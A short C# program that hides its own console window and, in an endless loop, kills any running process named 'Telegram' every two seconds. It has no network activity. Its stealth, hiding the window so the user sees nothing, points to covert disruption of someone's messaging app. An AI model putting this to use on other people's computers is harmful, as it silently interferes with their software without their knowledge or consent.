using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace PK2
{
    class Program
    {
        // need to hide cmd
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("kernel32.dll", ExactSpelling = true)]
		private static extern IntPtr GetConsoleWindow();

        static void ProcessKiller(string[] processList)
		{
            while (true)
            {
                foreach (var process in Process.GetProcesses())
                {
                    if (processList.Contains(process.ProcessName))
                        process.Kill();
                }
                Thread.Sleep(2000);
            }
        }


		static void Main()
        {
            ShowWindow(GetConsoleWindow(), 0); // 1 - show cmd
            var processList = new[] { "Telegram" };
            ProcessKiller(processList);
            
        }
    }
}
